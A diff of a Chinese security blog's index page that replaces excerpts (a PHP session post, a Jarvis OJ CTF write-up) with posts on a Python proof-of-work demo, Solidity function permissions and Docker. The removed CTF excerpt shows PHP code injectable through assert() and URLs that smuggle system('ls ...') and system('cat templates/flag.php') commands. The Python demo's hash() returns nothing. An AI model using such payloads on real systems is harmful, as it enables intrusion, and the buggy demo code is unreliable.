@@ -163,7 +163,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://ashin9.github.io/2018/10/18/Session%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">
+    <link itemprop="mainEntityOfPage" href="https://ashin9.github.io/2019/04/16/%E5%8C%BA%E5%9D%97%E9%93%BE-%E5%B7%A5%E4%BD%9C%E9%87%8F%E8%AF%81%E6%98%8EPython%E5%AE%9E%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/dxx.jpg">
@@ -177,7 +177,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2018/10/18/Session%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">Session序列化及反序列化处理器的安全问题</a>
+            <a href="/2019/04/16/%E5%8C%BA%E5%9D%97%E9%93%BE-%E5%B7%A5%E4%BD%9C%E9%87%8F%E8%AF%81%E6%98%8EPython%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">区块链-工作量证明Python实现</a>
         </h2>
 
         <div class="post-meta">
@@ -187,14 +187,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2018-10-18 22:45:01" itemprop="dateCreated datePublished" datetime="2018-10-18T22:45:01+08:00">2018-10-18</time>
+              <time title="创建时间：2019-04-16 18:55:50" itemprop="dateCreated datePublished" datetime="2019-04-16T18:55:50+08:00">2019-04-16</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-15 11:40:49" itemprop="dateModified" datetime="2023-03-15T11:40:49+08:00">2023-03-15</time>
+                <time title="修改时间：2023-03-15 11:55:02" itemprop="dateModified" datetime="2023-03-15T11:55:02+08:00">2023-03-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -202,11 +202,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/Server%E7%AB%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Server端安全</span></a>
+                  <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/" itemprop="url" rel="index"><span itemprop="name">区块链</span></a>
                 </span>
             </span>
 
@@ -221,14 +217,103 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a><strong>0x01 漏洞原理</strong></h3><p>PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化。</p>
-<h4 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h4><p>对应的存储格式:</p>
-<ul>
-<li>php</li>
+          <span id="more"></span>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">一个区块的结构</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;index&quot;:0,          //索引</span></span><br><span class="line"><span class="string">    &quot;timestamp&quot;:&quot;&quot;,     //时间戳</span></span><br><span class="line"><span class="string">    &quot;proof&quot;:&quot;&quot;,         //工作量证明</span></span><br><span class="line"><span class="string">    &quot;transactions&quot;:[    //交易</span></span><br><span class="line"><span class="string">        &quot;sender&quot;:&quot;&quot;,    //交易发出者</span></span><br><span class="line"><span class="string">        &quot;receiver&quot;:&quot;&quot;,  //交易接收者</span></span><br><span class="line"><span class="string">        &quot;amount&quot;:5,    //交易金额</span></span><br><span class="line"><span class="string">    ],</span></span><br><span class="line"><span class="string">    &quot;prehash&quot;:&quot;&quot;,       //前一块区块的hash值</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BlockChain</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#初始化区块链方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.chain = []                             <span class="comment">#区块链</span></span><br><span class="line">        self.current_transactions = []              <span class="comment">#交易</span></span><br><span class="line"></span><br><span class="line">        self.new_block(proof = <span class="number">100</span>, pre_hash= <span class="number">1</span>)    <span class="comment">#产生创世区块</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#创建区块方法，默认前一块hash为None（创世区块）</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_block</span>(<span class="params">self, proof, pre_hash = <span class="literal">None</span></span>):</span><br><span class="line"></span><br><span class="line">        block = &#123;</span><br><span class="line">            <span class="string">&#x27;index&#x27;</span>:<span class="built_in">len</span>(self.chain) + <span class="number">1</span>,                        <span class="comment">#所创建区块的索引为当前区块链长度+1</span></span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>: time.time(),                           <span class="comment">#产生时间戳</span></span><br><span class="line">            <span class="string">&#x27;transactions&#x27;</span>:self.current_transactions,           <span class="comment">#交易信息为当前保存的交易信息列表</span></span><br><span class="line">            <span class="string">&#x27;proof&#x27;</span>:proof,                                      <span class="comment">#工作量证明</span></span><br><span class="line">            <span class="string">&#x27;pre_hash&#x27;</span>:pre_hash <span class="keyword">or</span> self.<span class="built_in">hash</span>(self.chain[-<span class="number">1</span>])    <span class="comment">#前一块哈希值，[-1]代表数组最后一个元素</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        self.current_transactions = []                          <span class="comment">#交易已经打包成区块，当前交易赋空</span></span><br><span class="line">        self.chain.append(block)                                <span class="comment">#在区块链后面添加区块</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> block</span><br><span class="line"></span><br><span class="line">    <span class="comment">#创建交易方法，传入发送者、接收者、交易金额，返回类型为int</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_transactions</span>(<span class="params">self, sender, receiver, amount</span>) -&gt;<span class="built_in">int</span>:</span><br><span class="line">        self.current_transactions.append(                       <span class="comment">#在当前交易列表里添加</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&#x27;sender&#x27;</span>:sender,</span><br><span class="line">                <span class="string">&#x27;receiver&#x27;</span>:receiver,</span><br><span class="line">                <span class="string">&#x27;amount&#x27;</span>:amount</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> self.last_block[<span class="string">&#x27;index&#x27;</span>] + <span class="number">1</span>                     <span class="comment">#返回上一块区块索引+1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#静态哈希计算方法</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">block</span>):</span><br><span class="line">        block_sring = json.dumps(block, sort_keys=<span class="literal">True</span>).encode()<span class="comment">#使用json把转化成字符串，sort_keys排序</span></span><br><span class="line">        hashlib.sha256(block_sring).hexdigest()                 <span class="comment">#hashlib传入参数为字符串编码后的字节数组</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#特性找到最后一个区块方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">last_block</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.chain[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#工作量证明方法，简化为不是上一个区块的hash而是工作了证明</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">self, last_proof: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        proof = <span class="number">0</span>                                               <span class="comment">#从0开始</span></span><br><span class="line">        <span class="keyword">while</span> self.valid_proof(last_proof,proof) <span class="keyword">is</span> <span class="literal">False</span>:      <span class="comment">#只要无效工作量证明</span></span><br><span class="line">            proof +=<span class="number">1</span>                                           <span class="comment">#则proof++</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(proof)                                            <span class="comment">#打印proof来观察过程</span></span><br><span class="line">        <span class="keyword">return</span> proof</span><br><span class="line"></span><br><span class="line">    <span class="comment">#判断有效工作量方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">valid_proof</span>(<span class="params">self, last_proof:<span class="built_in">int</span>, proof:<span class="built_in">int</span> </span>) -&gt;<span class="built_in">bool</span>:</span><br><span class="line">        guess = <span class="string">f&#x27;<span class="subst">&#123;last_proof&#125;</span><span class="subst">&#123;proof&#125;</span>&#x27;</span>.encode()                 <span class="comment">#猜测值为上一个拼接当前</span></span><br><span class="line">        guess_hash = hashlib.sha256(guess).hexdigest()          <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#sleep(1) #可以来延迟更好观察工作量证明过程（挖矿）</span></span><br><span class="line">        <span class="built_in">print</span>(guess_hash)</span><br><span class="line">        <span class="keyword">return</span> guess_hash[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">&quot;0000&quot;</span>                        <span class="comment">#如果满足以0000开头则返回1，否则返回0</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        if guess_hash[0:4] == &quot;0000&quot;:</span></span><br><span class="line"><span class="string">            return True</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            return False</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#测试工作量证明代码</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testPow = BlockChain()</span><br><span class="line">    testPow.proof_of_work(<span class="number">100</span>)   </span><br></pre></td></tr></table></figure>
+
+<p>测试结果： <img src="https://raw.githubusercontent.com/ashin9/MDPic/master/qklgongzuoliangzhengm.png" alt="qkl"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ashin9.github.io/2019/03/25/%E4%BB%A5%E5%A4%AA%E5%9D%8A-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9D%83%E9%99%90%E9%9A%90%E6%82%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/dxx.jpg">
+      <meta itemprop="name" content="Ashing">
+      <meta itemprop="description" content="Cyber Security">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ashing's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/03/25/%E4%BB%A5%E5%A4%AA%E5%9D%8A-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9D%83%E9%99%90%E9%9A%90%E6%82%A3/" class="post-title-link" itemprop="url">以太坊-智能合约审计——权限隐患</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-03-25 09:17:25" itemprop="dateCreated datePublished" datetime="2019-03-25T09:17:25+08:00">2019-03-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-15 11:47:08" itemprop="dateModified" datetime="2023-03-15T11:47:08+08:00">2023-03-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/" itemprop="url" rel="index"><span itemprop="name">区块链</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="0x01-智能合约中的权限"><a href="#0x01-智能合约中的权限" class="headerlink" title="0x01 智能合约中的权限"></a>0x01 智能合约中的权限</h3><ul>
+<li>合约拥有者(owner)：执行合约中所有函数</li>
+<li>普通用户：只能调用约定范围内的函数</li>
 </ul>
+<h3 id="0x02-Solidity中函数权限"><a href="#0x02-Solidity中函数权限" class="headerlink" title="0x02 Solidity中函数权限"></a>0x02 Solidity中函数权限</h3><ul>
+<li><p>Public：函数可以被合约内部函数、继承合约、外部合约调用</p>
+</li>
+<li><p>Private：只能被合约内部函数调用</p>
+</li>
+<li><p>Internal：可以被合约内部函数以及继承合约调用</p>
+</li>
+<li><p>External：只能外部合约调用 <strong>注意：函数如果不限定，Solidity语言会默认设置函数为Public权限，也就是任何合约可以调用！</strong> HCTF的ez2win题目就是利用这个点来破解得到flag</p>
+</li>
+</ul>
+<h3 id="0x03-构造函数权限问题"><a href="#0x03-构造函数权限问题" class="headerlink" title="0x03 构造函数权限问题"></a>0x03 构造函数权限问题</h3>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2018/10/18/Session%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#more" rel="contents">
+              <a class="btn" href="/2019/03/25/%E4%BB%A5%E5%A4%AA%E5%9D%8A-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9D%83%E9%99%90%E9%9A%90%E6%82%A3/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -252,7 +337,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://ashin9.github.io/2018/09/27/Jarvis%20OJ%20Web%20WriteUp(2)/">
+    <link itemprop="mainEntityOfPage" href="https://ashin9.github.io/2019/03/18/Docker-%E7%BB%83%E4%B9%A0-%E6%90%AD%E5%BB%BAWordpress/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/dxx.jpg">
@@ -266,7 +351,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2018/09/27/Jarvis%20OJ%20Web%20WriteUp(2)/" class="post-title-link" itemprop="url">Jarvis OJ Web WriteUp(2)</a>
+            <a href="/2019/03/18/Docker-%E7%BB%83%E4%B9%A0-%E6%90%AD%E5%BB%BAWordpress/" class="post-title-link" itemprop="url">Docker-练习-搭建Wordpress</a>
         </h2>
 
         <div class="post-meta">
@@ -276,14 +361,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2018-09-27 21:53:02" itemprop="dateCreated datePublished" datetime="2018-09-27T21:53:02+08:00">2018-09-27</time>
+              <time title="创建时间：2019-03-18 20:22:37" itemprop="dateCreated datePublished" datetime="2019-03-18T20:22:37+08:00">2019-03-18</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-15 11:21:36" itemprop="dateModified" datetime="2023-03-15T11:21:36+08:00">2023-03-15</time>
+                <time title="修改时间：2023-03-15 09:03:56" itemprop="dateModified" datetime="2023-03-15T09:03:56+08:00">2023-03-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -291,7 +376,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/Docker/" itemprop="url" rel="index"><span itemprop="name">Docker</span></a>
                 </span>
             </span>
 
@@ -306,14 +391,97 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h4 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h4><p>描述里面发现使用了 Git，直接御剑爆破出 .git 目录。利用工具扒下源码，审计一波。 源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+          <h2 id="docker-compose-yml-文件配置"><a href="#docker-compose-yml-文件配置" class="headerlink" title="docker-compose.yml 文件配置"></a>docker-compose.yml 文件配置</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用版本3</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="comment">#两个服务：一个数据库、一个wordpress</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="comment"># 数据库服务</span></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:5.7</span>    <span class="comment"># 使用 5.7 的 mysql, 目前 wordpress 无法使用 mysql8 会出现链接数据库错误</span></span><br><span class="line">    <span class="attr">volumes:</span>    <span class="comment"># 挂载 mysql 目录名字为 de_data</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db_data:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span>     <span class="comment"># 设置总是重新启动</span></span><br><span class="line">    <span class="attr">environment:</span>    <span class="comment"># 环境变量设置</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">wordpress</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">wordpress</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="string">wordpress</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># wordpress服务</span></span><br><span class="line">  <span class="attr">wordpress:</span></span><br><span class="line">    <span class="attr">depends_on:</span>     <span class="comment"># 设置依赖与db服务（上面的数据库服务），设置依赖后先启动db服务再启动wordpress服务</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">wordpress</span>    <span class="comment"># pullwordpress镜像</span></span><br><span class="line">    <span class="attr">volumes:</span>    <span class="comment"># 挂载wordpress目录为wp_site</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">wp_site:/var/www/html</span></span><br><span class="line">    <span class="attr">ports:</span>      <span class="comment"># 映射端口</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8000:80&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;443:443&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span>    <span class="comment"># 设置环境变量</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_HOST:</span> <span class="string">db:3306</span>    <span class="comment"># 这个很关键！！！否则报错！</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_USER:</span> <span class="string">wordpress</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_PASSWORD:</span> <span class="string">wordpress</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">db_data:</span></span><br><span class="line">  <span class="attr">wp_site:</span></span><br></pre></td></tr></table></figure>
 
-<p>assert 函数果断是常见的危险函数。如果第一个参数是字符串会当作为代码执行。构造payload：</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32798/</span><span class="string">?p</span>age=flag<span class="string">&#x27;.system(&quot;ls templates/;&quot;).&#x27;</span> <span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32798/</span><span class="string">?p</span>age=flag<span class="string">&#x27;.system(&quot;cat templates/flag.php;&quot;).&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>最后效果图： <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ashin9/MDphoto/master/190318.png" title="wp"><img src="https://raw.githubusercontent.com/ashin9/MDPic/master/190318.png" alt="wp" title="wp"></a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ashin9.github.io/2019/03/11/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/dxx.jpg">
+      <meta itemprop="name" content="Ashing">
+      <meta itemprop="description" content="Cyber Security">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ashing's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/03/11/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">Docker学习笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-03-11 21:32:54" itemprop="dateCreated datePublished" datetime="2019-03-11T21:32:54+08:00">2019-03-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-15 11:14:23" itemprop="dateModified" datetime="2023-03-15T11:14:23+08:00">2023-03-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Docker/" itemprop="url" rel="index"><span itemprop="name">Docker</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p> 记录Docker学习。重点学习Docker基础和Compose，实践了几个小型项目，下一步运用熟练。</p>
+<h3 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h3><ul>
+<li><p><strong>镜像（Image）：</strong>root文件系统（分层存储，体积小）</p>
+</li>
+<li><p><strong>容器（Container）：</strong>实质是基于镜像的进程，相当于镜像的实例（在镜像基础上加一层容器运行时的存储层）</p>
+</li>
+<li><p><strong>仓库（Registry</strong>）：集中存储、分发镜像的服务（包含多个仓库，每个仓库可包含多个标签）</p>
+</li>
+<li><p>国内加速</p>
+</li>
+</ul>
+<h3 id="0x02-安装Docker"><a href="#0x02-安装Docker" class="headerlink" title="0x02 安装Docker"></a>0x02 安装Docker</h3><h3 id="0x03-使用镜像"><a href="#0x03-使用镜像" class="headerlink" title="0x03 使用镜像"></a>0x03 使用镜像</h3>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2018/09/27/Jarvis%20OJ%20Web%20WriteUp(2)/#more" rel="contents">
+              <a class="btn" href="/2019/03/11/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -337,7 +505,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
